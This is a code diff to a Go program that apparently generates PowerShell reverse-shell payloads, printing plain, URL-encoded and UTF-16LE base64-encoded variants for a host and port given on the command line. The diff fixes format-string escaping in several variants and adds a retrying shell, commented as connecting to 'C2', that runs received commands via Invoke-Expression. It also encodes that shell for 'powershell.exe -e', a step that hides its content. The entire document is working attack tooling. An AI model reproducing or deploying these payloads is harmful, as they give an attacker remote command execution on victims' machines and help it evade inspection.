@@ -2,9 +2,11 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"net/url"
 	"os"
+	"unicode/utf16"
 )
 
 func main() {
@@ -139,19 +141,69 @@ func main() {
 	}
 
 	if os.Args[1] == "powershell" {
-		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
+		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
 		fmt.Println(payload)
 	}
 
 	if os.Args[1] == "powershell_b64" {
-		payload := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", os.Args[2], os.Args[3])
-		input := []byte(payload)
-		encoded := base64.StdEncoding.EncodeToString(input)
+		payload := fmt.Sprintf(`do {
+			# Delay before establishing network connection, and between retries
+			Start-Sleep -Seconds 1
+		
+			# Connect to C2
+			try{
+				$TCPClient = New-Object Net.Sockets.TCPClient('%s', %s)
+			} catch {}
+		} until ($TCPClient.Connected)
+		
+		$NetworkStream = $TCPClient.GetStream()
+		$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+		
+		# Writes a string to C2
+		function WriteToStream ($String) {
+			# Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+			[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | %% {0}
+		
+			# Write to C2
+			$StreamWriter.Write($String + 'SHELL> ')
+			$StreamWriter.Flush()
+		}
+		
+		# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+		WriteToStream ''
+		
+		# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+		while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+			# Encode command, remove last byte/newline
+			$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+			
+			# Execute command and save output (including errors thrown)
+			$Output = try {
+					Invoke-Expression $Command 2>&1 | Out-String
+				} catch {
+					$_ | Out-String
+				}
+		
+			# Write output to C2
+			WriteToStream ($Output)
+		}
+		# Closes the StreamWriter and the underlying TCPClient
+		$StreamWriter.Close()`, os.Args[2], os.Args[3])
+
+		// Convert payload to UTF-16LE
+		utf16Payload := utf16.Encode([]rune(payload))
+		utf16Bytes := make([]byte, len(utf16Payload)*2)
+		for i, v := range utf16Payload {
+			binary.LittleEndian.PutUint16(utf16Bytes[i*2:], v)
+		}
+
+		// Base64 encode the UTF-16LE payload
+		encoded := base64.StdEncoding.EncodeToString(utf16Bytes)
 		fmt.Println("powershell.exe -e " + encoded)
 	}
 
 	if os.Args[1] == "powershell_urlencode" {
-		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
+		payload := fmt.Sprintf("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", os.Args[2], os.Args[3])
 		fmt.Println(url.QueryEscape(payload))
 	}
 
